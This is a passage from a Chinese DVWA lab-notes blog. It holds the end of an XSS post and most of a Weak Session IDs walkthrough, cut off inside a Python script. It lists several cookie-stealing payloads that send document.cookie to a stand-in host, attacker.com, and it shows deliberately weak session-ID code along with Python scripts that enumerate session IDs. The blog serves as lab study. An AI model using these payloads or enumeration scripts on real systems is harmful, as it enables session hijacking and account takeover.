<h3 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 简单窃取 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://attacker.com/?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用fetch --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;http://attacker.com/?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用img --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;this.src=&#x27;http://attacker.com/?c=&#x27;+document.cookie&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用XMLHttpRequest --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> xhr=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;http://attacker.com/?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>学习路径：</strong></p>
<ol>
<li><strong>Low难度</strong> - 理解XSS基本原理</li>
<li><strong>Medium难度</strong> - 学习简单绕过技巧</li>
<li><strong>High难度</strong> - 掌握正则绕过方法</li>
<li><strong>Impossible难度</strong> - 理解正确的防御</li>
</ol>
<p><strong>测试流程：</strong></p>
<ol>
<li>输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>测试</li>
<li>如果被过滤，尝试大小写混淆</li>
<li>如果仍被过滤，使用其他标签</li>
<li>使用Burp Suite查看过滤规则</li>
<li>针对性构造Payload</li>
</ol>
<p><strong>工具推荐：</strong></p>
<ul>
<li>Burp Suite - 拦截和修改请求</li>
<li>XSSer - 自动化XSS扫描</li>
<li>BeEF - 浏览器利用框架</li>
<li>XSS Hunter - XSS盲打平台</li>
</ul>
<p><strong>道德准则：</strong></p>
<ul>
<li>只在授权环境测试</li>
<li>不窃取真实用户数据</li>
<li>学习目的是防御，不是攻击</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en,zh-CN,default">
    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/Weak_Session_IDs_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="caixuya">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tia的学习笔记">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/20/Weak_Session_IDs_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">DVWA - Weak Session IDs (弱会话ID) 攻防练习详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:25:29" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
</ul>
<hr>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是Weak-Session-IDs（弱会话ID）？"><a href="#什么是Weak-Session-IDs（弱会话ID）？" class="headerlink" title="什么是Weak Session IDs（弱会话ID）？"></a>什么是Weak Session IDs（弱会话ID）？</h3><p>Session ID是服务器用来识别用户会话的唯一标识符。弱会话ID是指可预测、容易猜测或破解的会话标识符。</p>
<p><strong>Session的作用：</strong></p>
<ul>
<li>在HTTP无状态协议中维持用户状态</li>
<li>识别已登录用户</li>
<li>存储用户会话数据</li>
</ul>
<p><strong>危害：</strong></p>
<ul>
<li>会话劫持（Session Hijacking）</li>
<li>会话固定（Session Fixation）</li>
<li>未授权访问</li>
<li>账户接管</li>
<li>身份伪装</li>
</ul>
<p><strong>弱Session ID的特征：</strong></p>
<ul>
<li>可预测（如连续递增）</li>
<li>熵值太低（如只有数字）</li>
<li>基于时间戳</li>
<li>短长度</li>
<li>不随机</li>
</ul>
<hr>
<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用简单的计数器作为Session ID，完全可预测。</p>
<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 危险操作：使用简单计数器作为Session ID ★★★</span></span><br><span class="line"><span class="comment">// 检查cookie中是否有dvwaSession</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="keyword">isset</span>( <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;dvwaSession&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 初始化：从0开始计数 ★★★</span></span><br><span class="line">    <span class="comment">// 第一个用户：dvwaSession=0</span></span><br><span class="line">    <span class="comment">// 第二个用户：dvwaSession=1</span></span><br><span class="line">    <span class="comment">// 第三个用户：dvwaSession=2</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 完全可预测！</span></span><br><span class="line">    <span class="variable">$last_session_id</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 尝试读取上一个Session ID ★★★</span></span><br><span class="line">    <span class="comment">// 从文件中读取最后使用的Session ID</span></span><br><span class="line">    <span class="comment">// __DIR__ - 当前文件所在目录</span></span><br><span class="line">    <span class="comment">// DIRECTORY_SEPARATOR - 目录分隔符</span></span><br><span class="line">    <span class="comment">// sessionid.txt - 存储Session ID的文件</span></span><br><span class="line">    <span class="variable">$sessionid_path</span> = <span class="keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;sessionid.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// file_exists() - 检查文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">file_exists</span>( <span class="variable">$sessionid_path</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 读取上一个Session ID ★★★</span></span><br><span class="line">        <span class="comment">// file_get_contents() - 读取文件内容</span></span><br><span class="line">        <span class="comment">// intval() - 将字符串转换为整数</span></span><br><span class="line">        <span class="variable">$last_session_id</span> = <span class="title function_ invoke__">intval</span>( <span class="title function_ invoke__">file_get_contents</span>( <span class="variable">$sessionid_path</span> ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 生成新的Session ID：简单递增 ★★★</span></span><br><span class="line">    <span class="comment">// 新Session ID = 上一个ID + 1</span></span><br><span class="line">    <span class="comment">// 问题：完全可预测！</span></span><br><span class="line">    <span class="variable">$session_id</span> = ++<span class="variable">$last_session_id</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 保存新的Session ID到文件 ★★★</span></span><br><span class="line">    <span class="comment">// file_put_contents() - 将内容写入文件</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>( <span class="variable">$sessionid_path</span>, <span class="variable">$session_id</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 设置Cookie ★★★</span></span><br><span class="line">    <span class="comment">// setcookie() - 设置Cookie</span></span><br><span class="line">    <span class="comment">// 参数1：Cookie名称</span></span><br><span class="line">    <span class="comment">// 参数2：Cookie值</span></span><br><span class="line">    <span class="comment">// 参数3：过期时间（0表示会话结束时删除）</span></span><br><span class="line">    <span class="comment">// 参数4：Cookie路径</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. Session ID完全可预测</span></span><br><span class="line">    <span class="comment">// 2. 没有HttpOnly标志（可被JavaScript读取）</span></span><br><span class="line">    <span class="comment">// 3. 没有Secure标志（可通过HTTP传输）</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>( <span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$session_id</span>, <span class="number">0</span>, <span class="string">&quot;/&quot;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示当前Session ID</span></span><br><span class="line"><span class="variable">$cookie_value</span> = <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;dvwaSession&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>Session ID生成方式：</strong></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用户<span class="number">1</span>：dvwaSession <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">用户<span class="number">2</span>：dvwaSession <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">用户<span class="number">3</span>：dvwaSession <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">用户<span class="number">4</span>：dvwaSession <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">...</span><br><span class="line">用户N：dvwaSession <span class="operator">=</span> N-<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>核心问题：</strong></p>
<ol>
<li><strong>完全可预测</strong> - 简单递增</li>
<li><strong>低熵值</strong> - 只是数字</li>
<li><strong>易于暴力破解</strong> - 从0开始尝试</li>
<li><strong>无安全标志</strong> - 无HttpOnly、Secure</li>
<li><strong>存储在文件</strong> - 不安全</li>
</ol>
<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：观察Session-ID模式"><a href="#步骤1：观察Session-ID模式" class="headerlink" title="步骤1：观察Session ID模式"></a>步骤1：观察Session ID模式</h4><p><strong>测试：</strong></p>
<ol>
<li>清除Cookie</li>
<li>访问DVWA的Weak Session IDs页面</li>
<li>记录你的Session ID（例如：15）</li>
<li>清除Cookie，再次访问</li>
<li>记录新的Session ID（例如：16）</li>
<li>重复几次</li>
</ol>
<p><strong>发现：Session ID连续递增！</strong></p>
<h4 id="步骤2：枚举其他用户的Session"><a href="#步骤2：枚举其他用户的Session" class="headerlink" title="步骤2：枚举其他用户的Session"></a>步骤2：枚举其他用户的Session</h4><p><strong>Python脚本：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/weak_id/&quot;</span></span><br><span class="line">cookies_base = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;low&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;你的PHPSESSID&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设当前Session ID是100</span></span><br><span class="line"><span class="comment"># 枚举前后的Session ID</span></span><br><span class="line"><span class="keyword">for</span> session_id <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>, <span class="number">110</span>):</span><br><span class="line">    cookies = cookies_base.copy()</span><br><span class="line">    cookies[<span class="string">&#x27;dvwaSession&#x27;</span>] = <span class="built_in">str</span>(session_id)</span><br><span class="line"></span><br><span class="line">    response = requests.get(url, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Testing dvwaSession=<span class="subst">&#123;session_id&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># 检查是否能访问</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Session <span class="subst">&#123;session_id&#125;</span> is valid!&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="步骤3：会话劫持"><a href="#步骤3：会话劫持" class="headerlink" title="步骤3：会话劫持"></a>步骤3：会话劫持</h4><p><strong>场景：</strong></p>
<ol>
<li>攻击者获知受害者的Session ID（通过XSS、网络嗅探等）</li>
<li>或者通过枚举猜测Session ID</li>
<li>使用该Session ID访问应用</li>
<li>冒充受害者身份</li>
</ol>
<p><strong>使用Burp Suite：</strong></p>
<ol>
<li>拦截请求</li>
<li>修改Cookie中的dvwaSession值</li>
<li>尝试不同的数字</li>
<li>找到有效的Session</li>
</ol>
<h4 id="步骤4：会话固定攻击"><a href="#步骤4：会话固定攻击" class="headerlink" title="步骤4：会话固定攻击"></a>步骤4：会话固定攻击</h4><p><strong>攻击流程：</strong></p>
<ol>
<li>攻击者清除Cookie，访问DVWA</li>
<li>记录自己的dvwaSession（例如：50）</li>
<li>诱导受害者使用这个Session（发送链接）</li>
<li>受害者使用dvwaSession&#x3D;50登录</li>
<li>攻击者也使用dvwaSession&#x3D;50访问</li>
<li>攻击者获得受害者的权限</li>
</ol>
<hr>
<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用时间戳作为Session ID，仍然可预测。</p>
<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( !<span class="keyword">isset</span>( <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;dvwaSession&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 使用时间戳作为Session ID ★★★</span></span><br><span class="line">    <span class="comment">// time() - 返回当前Unix时间戳（从1970-01-01 00:00:00 UTC到现在的秒数）</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 时间戳是可预测的</span></span><br><span class="line">    <span class="comment">// 2. 攻击者知道大致的时间范围</span></span><br><span class="line">    <span class="comment">// 3. 只需要在时间窗口内枚举</span></span><br><span class="line">    <span class="variable">$session_id</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置Cookie</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>( <span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$session_id</span>, <span class="number">0</span>, <span class="string">&quot;/&quot;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cookie_value</span> = <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;dvwaSession&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><p>使用时间戳替代简单计数器</p>
<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
<p>时间戳仍然是可预测的！</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2024-11-20</span> <span class="number">22</span>:<span class="number">00</span>:<span class="number">00</span> → <span class="number">1700503200</span></span><br><span class="line"><span class="number">2024-11-20</span> <span class="number">22</span>:<span class="number">00</span>:<span class="number">01</span> → <span class="number">1700503201</span></span><br><span class="line"><span class="number">2024-11-20</span> <span class="number">22</span>:<span class="number">00</span>:<span class="number">02</span> → <span class="number">1700503202</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>攻击者可以：</strong></p>
<ol>
<li>知道大致的时间范围</li>
<li>在这个范围内枚举（±几分钟）</li>
<li>找到有效的Session ID</li>
</ol>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：时间窗口枚举"><a href="#方法1：时间窗口枚举" class="headerlink" title="方法1：时间窗口枚举"></a>方法1：时间窗口枚举</h4><p><strong>Python脚本：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/weak_id/&quot;</span></span><br><span class="line">cookies_base = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;你的PHPSESSID&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前时间戳</span></span><br><span class="line">current_time = <span class="built_in">int</span>(time.time())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举前后5分钟的时间戳（300秒）</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">300</span>, <span class="number">300</span>):</span><br><span class="line">    session_id = current_time + offset</span><br><span class="line"></span><br><span class="line">    cookies = cookies_base.copy()</span><br><span class="line">    cookies[<span class="string">&#x27;dvwaSession&#x27;</span>] = <span class="built_in">str</span>(session_id)</span><br><span class="line"></span><br><span class="line">    response = requests.get(url, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;valid session&quot;</span> <span class="keyword">in</span> response.text.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Found valid session: <span class="subst">&#123;session_id&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    Timestamp: <span class="subst">&#123;time.ctime(session_id)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="方法2：已知用户登录时间"><a href="#方法2：已知用户登录时间" class="headerlink" title="方法2：已知用户登录时间"></a>方法2：已知用户登录时间</h4><p>如果知道用户的登录时间（如：2024-11-20 15:30:00），可以：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知登录时间</span></span><br><span class="line">login_time = datetime.datetime(<span class="number">2024</span>, <span class="number">11</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">30</span>, <span class="number">0</span>)</span><br><span class="line">timestamp = <span class="built_in">int</span>(login_time.timestamp())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在前后1分钟内枚举</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">60</span>, <span class="number">60</span>):</span><br><span class="line">    session_id = timestamp + offset</span><br><span class="line">    <span class="comment"># 测试这个Session ID</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Trying: <span class="subst">&#123;session_id&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用MD5哈希，但基于时间戳，仍可预测。</p>
<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( !<span class="keyword">isset</span>( <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;dvwaSession&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 使用MD5哈希时间戳 ★★★</span></span><br><span class="line">    <span class="comment">// time() - 当前时间戳</span></span><br><span class="line">    <span class="comment">// md5() - MD5哈希函数</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 例如：</span></span><br><span class="line">    <span class="comment">// time() = 1700503200</span></span><br><span class="line">    <span class="comment">// md5(1700503200) = &quot;8e296a067a37563370ded05f5a3bf3ec&quot;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 虽然看起来随机，但基础数据（时间戳）是可预测的</span></span><br><span class="line">    <span class="comment">// 2. 攻击者可以预计算时间范围内的所有MD5值</span></span><br><span class="line">    <span class="comment">// 3. 然后枚举测试</span></span><br><span class="line">    <span class="variable">$session_id</span> = <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">time</span>() );</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>( <span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$session_id</span>, <span class="number">0</span>, <span class="string">&quot;/&quot;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cookie_value</span> = <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;dvwaSession&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><p>使用MD5哈希时间戳</p>
<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
<p>虽然使用了MD5，但输入源（时间戳）是可预测的！</p>
<p><strong>攻击原理：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预计算MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">current = <span class="built_in">int</span>(time.time())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成前后5分钟的所有MD5值</span></span><br><span class="line">md5_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">300</span>, <span 